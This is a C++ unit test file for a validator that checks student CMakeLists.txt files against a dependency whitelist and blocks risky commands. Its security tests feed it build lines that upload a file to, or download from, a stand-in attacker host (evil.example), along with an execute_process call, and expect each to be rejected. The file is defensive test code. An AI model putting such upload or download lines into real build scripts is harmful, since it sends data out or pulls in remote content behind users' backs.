// Unit tests for CMakeValidator - the regex-based whitelist enforcer that
// scans a student CMakeLists.txt for forbidden dependency usage.

#include <cmake_validator.h>
#include <gtest/gtest.h>

#include "test_temp_dir.h"


namespace {

    CMakeValidator::Result validate(
        const std::string& cmake_text,
        const std::vector<std::string>& allowed
    ) {
        TempDir dir;
        auto file = dir.write_file("CMakeLists.txt", cmake_text);
        return CMakeValidator::validate(file, allowed);
    }

    bool any_violation_contains(const CMakeValidator::Result& r, const std::string& fragment) {
        for(const auto& v : r.violations) {
            if(v.find(fragment) != std::string::npos) return true;
        }
        return false;
    }

} // namespace

// -----------------------------------------------------------------------------
// File handling
// -----------------------------------------------------------------------------

TEST(CMakeValidator, missing_file_is_treated_as_valid) {
    // Caller may pass a path that doesn't exist (e.g., student solution
    // doesn't ship a CMake yet). validate() should not crash or fail.
    auto r = CMakeValidator::validate("definitely/missing.txt", {"OpenMP"});
    EXPECT_TRUE(r.valid);
    EXPECT_TRUE(r.violations.empty());
}

TEST(CMakeValidator, empty_file_is_valid) {
    auto r = validate("", {"OpenMP"});
    EXPECT_TRUE(r.valid);
}

// -----------------------------------------------------------------------------
// find_package
// -----------------------------------------------------------------------------

TEST(CMakeValidator, find_package_allowed) {
    auto r = validate("find_package(OpenMP REQUIRED)", {"OpenMP"});
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, find_package_unknown_is_violation) {
    auto r = validate("find_package(Boost REQUIRED)", {"OpenMP"});
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "find_package(Boost)"));
}

TEST(CMakeValidator, find_package_case_insensitive_match) {
    // Lookup is case-insensitive - "openmp" allowed should still match
    // a real-world "find_package(OpenMP)" line.
    auto r = validate("find_package(OpenMP REQUIRED)", {"openmp"});
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, find_package_keyword_itself_is_case_insensitive) {
    auto r = validate("FIND_PACKAGE(OpenMP REQUIRED)", {"OpenMP"});
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, find_library_violation) {
    auto r = validate("find_library(MY_LIB nope)", {"OpenMP"});
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "find_library(MY_LIB)"));
}

// -----------------------------------------------------------------------------
// Comments must not be parsed
// -----------------------------------------------------------------------------

TEST(CMakeValidator, commented_find_package_is_ignored) {
    auto r = validate(
        "# find_package(Boost REQUIRED)\nfind_package(OpenMP)",
        {"OpenMP"}
    );
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, hash_inside_quotes_does_not_start_a_comment) {
    // '#' between quotes must NOT terminate the line - otherwise the
    // following real violation would be hidden.
    auto r = validate(
        "set(MSG \"this is a # sign\")\nfind_package(Boost)",
        {"OpenMP"}
    );
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "find_package(Boost)"));
}

TEST(CMakeValidator, end_of_line_comment_strips_only_after_hash) {
    auto r = validate("find_package(OpenMP) # ok", {"OpenMP"});
    EXPECT_TRUE(r.valid);
}

// -----------------------------------------------------------------------------
// FetchContent / ExternalProject
// -----------------------------------------------------------------------------

TEST(CMakeValidator, fetch_content_declare_violation) {
    auto r = validate(
        R"(FetchContent_Declare(nlohmann_json GIT_REPOSITORY .....))",
        {"OpenMP"}
    );
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "FetchContent_Declare(nlohmann_json)"));
}

TEST(CMakeValidator, fetch_content_make_available_multi_arg) {
    auto r = validate(
        "FetchContent_MakeAvailable(allowedone forbiddenone)",
        {"allowedone"}
    );
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "FetchContent_MakeAvailable(forbiddenone)"));
    // Allowed one must not produce a violation.
    EXPECT_FALSE(any_violation_contains(r, "FetchContent_MakeAvailable(allowedone)"));
}

TEST(CMakeValidator, external_project_add_violation) {
    auto r = validate("ExternalProject_Add(thirdparty URL ...)", {"OpenMP"});
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "ExternalProject_Add(thirdparty)"));
}

// -----------------------------------------------------------------------------
// target_link_libraries
// -----------------------------------------------------------------------------

TEST(CMakeValidator, tll_first_token_is_the_target_and_is_skipped) {
    // 'sol' is the target name - must not be treated as a dependency even if
    // it's not in the whitelist.
    auto r = validate(
        "target_link_libraries(sol PRIVATE OpenMP::OpenMP_CXX)",
        {"OpenMP"}
    );
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, tll_keywords_skipped) {
    auto r = validate(
        "target_link_libraries(sol PUBLIC OpenMP PRIVATE parallel_lib INTERFACE Cilk)",
        {"OpenMP", "parallel_lib", "Cilk"}
    );
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, tll_namespaced_target_always_allowed) {
    // OpenMP::OpenMP_CXX, Threads::Threads, parlay::parlay - the validator
    // doesn't look these up, anything with "::" passes.
    auto r = validate(
        "target_link_libraries(sol PRIVATE Boost::system Threads::Threads)",
        {"OpenMP"}
    );
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, tll_generator_expression_skipped) {
    auto r = validate(
        "target_link_libraries(sol PRIVATE $<TARGET_OBJECTS:foo>)",
        {"OpenMP"}
    );
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, tll_linker_flag_skipped) {
    auto r = validate(
        "target_link_libraries(sol PRIVATE -lpthread -Wl,--no-as-needed)",
        {"OpenMP"}
    );
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, tll_system_libs_skipped) {
    auto r = validate(
        "target_link_libraries(sol PRIVATE pthread m dl rt c gomp atomic)",
        {"OpenMP"}
    );
    EXPECT_TRUE(r.valid);
}

TEST(CMakeValidator, tll_unauthorized_plain_target_is_violation) {
    auto r = validate("target_link_libraries(sol PRIVATE evil_dep)", {"OpenMP"});
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "evil_dep"));
}

TEST(CMakeValidator, tll_match_is_case_insensitive_against_whitelist) {
    auto r = validate("target_link_libraries(sol PRIVATE OPENMP)", {"openmp"});
    EXPECT_TRUE(r.valid);
}

// -----------------------------------------------------------------------------
// Blocked commands (security)
// -----------------------------------------------------------------------------

TEST(CMakeValidator, execute_process_is_always_blocked) {
    auto r = validate("execute_process(COMMAND ls)", {"OpenMP"});
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "execute_process()"));
}

TEST(CMakeValidator, execute_process_case_insensitive) {
    auto r = validate("EXECUTE_PROCESS(COMMAND ls)", {"OpenMP"});
    EXPECT_FALSE(r.valid);
}

TEST(CMakeValidator, file_download_is_blocked) {
    auto r = validate("file(DOWNLOAD https://evil.example/out ${TMP})", {"OpenMP"});
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "file(DOWNLOAD)"));
}

TEST(CMakeValidator, file_upload_is_blocked) {
    auto r = validate("file(UPLOAD ${OUT} https://evil.example/x)", {"OpenMP"});
    EXPECT_FALSE(r.valid);
    EXPECT_TRUE(any_violation_contains(r, "file(UPLOAD)"));
}

TEST(CMakeValidator, file_other_subcommands_unaffected) {
    // file(GLOB ...), file(READ ...) etc are not network ops - must be allowed.
    auto r = validate(
        "file(GLOB sources *.cpp)\nfile(READ thing.txt CONTENTS)",
        {"OpenMP"}
    );
    EXPECT_TRUE(r.valid);
}

// -----------------------------------------------------------------------------
// Multiple violations accumulate
// -----------------------------------------------------------------------------

TEST(CMakeValidator, multiple_violations_are_all_reported) {
    auto r = validate(
        R"(
        find_package(Boost)
        find_package(NotAllowed)
        target_link_libraries(sol PRIVATE evil)
        execute_process(COMMAND ls)
    )",
        {"OpenMP"}
    );
    EXPECT_FALSE(r.valid);
    EXPECT_GE(r.violations.size(), 4u);
}
